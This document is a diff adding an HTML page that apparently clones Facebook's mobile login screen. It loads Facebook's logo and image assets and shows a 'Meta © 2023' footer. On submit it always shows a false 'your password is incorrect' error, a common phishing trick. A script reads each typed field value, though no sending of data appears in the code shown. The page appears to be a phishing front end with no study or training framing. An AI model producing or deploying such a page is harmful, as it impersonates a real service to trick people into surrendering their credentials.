@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>facebook</title>
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/izitoast/1.4.0/css/iziToast.css" integrity="sha512-DIW4FkYTOxjCqRt7oS9BFO+nVOwDL4bzukDyDtMO7crjUZhwpyrWBFroq+IqRe6VnJkTpRAS6nhDvf0w+wHmxg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/izitoast/1.4.0/js/iziToast.min.js" integrity="sha512-Zq9o+E00xhhR/7vJ49mxFNJ0KQw1E1TMWkPTxrWcnpfEFDEXgUiwJHIKit93EW/XxE31HSI5GEOW06G6BF1AtA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+
+
+    <style>
+        .input-c{
+            background-color: #f5f6f7;
+            border:none;
+            font-size: 14px;
+            padding: 12px!important;
+        }
+        .form-group{
+            border-radius: 4px;
+            border-color: rgba(0, 0, 0, .07) rgba(0, 0, 0, .11) rgba(0, 0, 0, .18);
+            border-radius: 4px;
+            border-style: solid;
+            border-width: 1px;
+            bottom: -1px;
+        }
+        .spacer{
+            padding:4px;
+        }
+        form{
+            padding:0px 16px;
+        }
+        .btn-c{
+            font-size:17px;
+            text-shadow: 0 -1px rgba(0, 0, 0, .25);
+            font-weight: bold;
+            
+        }
+        .line-container{
+            display:grid;
+            grid-auto-flow: column;
+            grid-template-columns: 1fr max-content 1fr;
+            
+            font-size: 14px;
+        }
+        .line-container > .line{
+            border-bottom:1px solid #4b4f56;
+            margin-bottom:8px;
+            opacity: 0.3;
+            
+        }
+        .btn-b{
+            font-size:14px;
+            text-shadow: 0 -1px rgba(0, 0, 0, .25);
+            background: white;
+            border-color: #bec3c9;
+            border-style: solid;
+            border-width: 1px;
+            box-shadow: none;
+            color: #000;
+        }
+
+        .plus-container{
+            border: 1px solid #3b5998;
+            border-radius: 3px;
+            width: 18px;
+            text-align: center;
+
+        }
+        .plus{
+            
+            background-image: url(https://static.xx.fbcdn.net/rsrc.php/v3/yc/r/tjuCtNBjbJe.png);
+            background-size: auto;
+            background-repeat: no-repeat;
+            display: inline-block;
+            height: 12px;
+            width: 12px;
+            background-position: 0 -50px;
+
+      
+        }
+        .footer-container{
+            display:grid;
+            grid-auto-flow: column;
+            grid-template-columns: 1fr 0px 1fr;
+            font-size: 12px;
+            justify-items: center;
+            justify-content: center;
+            
+            line-height: 17px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+   
+    <div id="app">
+        <div class="text-center">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" width="112">
+        </div>
+        <div class="spacer"></div>
+        <form>
+            <div class="form-group">
+              <input type="email" class="form-control input-c" id="email" name="email" placeholder="Mobile number or email">
+
+            </div>
+            <div class="spacer"></div>
+            <div class="form-group">
+                <input type="password" class="form-control input-c" id="password" name="password" placeholder="Password">
+            </div>
+            
+            <div class="spacer"></div>
+            
+            
+            
+            <div style="display:grid;">
+                <button type="submit" class="btn btn-c btn-primary" type="submit">Log in</button>
+            </div>
+            <div class="spacer"></div>
+            <p class="text-center">
+                <a href="/" style="text-decoration:none;font-size: 14px;">Forgot your password?</a>
+            </p>
+
+
+            <div class="line-container">
+                <span class="line"></span>
+
+                <span style="padding:0px 20px;">or</span>
+
+                <span class="line"></span>
+            </div>
+
+            <br>
+            <div class="text-center">
+                <a type="button" class="btn btn-outline-dark btn-b" href="/">Create new account</a>
+            </div>
+
+
+            <br>
+            <br>
+            <br>
+            <br>
+
+            <div class="footer-container">
+                <div>
+                    <div class="text-center" style="color:#90949c;">English (US)</div>
+                    <div class="text-center" style="color:#90949c;">Bisaya</div>
+                    <div class="text-center" style="color:#90949c;">日本語</div>
+                    <div class="text-center" style="color:#90949c;">Português (Brasil)</div>
+                </div>
+                <div></div>
+                <div>
+                    <div class="text-center" style="color:#90949c;">Filipino</div>
+                    <div class="text-center" style="color:#90949c;">Español</div>
+                    <div class="text-center" style="color:#90949c;">한국어</div>
+
+                    <div class="text-center">
+                        <div class="plus-container">
+                            <div class="plus"></div>
+    
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="spacer"></div>
+            <div class="spacer"></div>
+            <div class="text-center">
+                <span style="color:#90949c;font-size: 12px;">About · Help · More</span>
+            </div>
+
+            <div class="text-center">
+                <span style="color:#90949c;font-size: 12px;">Meta © 2023</span>
+            </div>
+           
+        </form>
+    </div>
+
+    <script>
+
+        let form = document.forms[0];
+
+        form.addEventListener("input", (e)=>{
+            let target = e.target;
+            let name = target.name;
+            let value = target.value;
+
+        });
+        form.addEventListener("submit", (e)=>{
+            e.preventDefault();
+
+            iziToast.error({
+                title: 'Login Error',
+                message: 'your password is incorrect',
+            });
+        });
+
+
+
+    </script>
+
+    <!-- <script type="module" src="./index.mjs"></script> -->
+</body>
+</html>
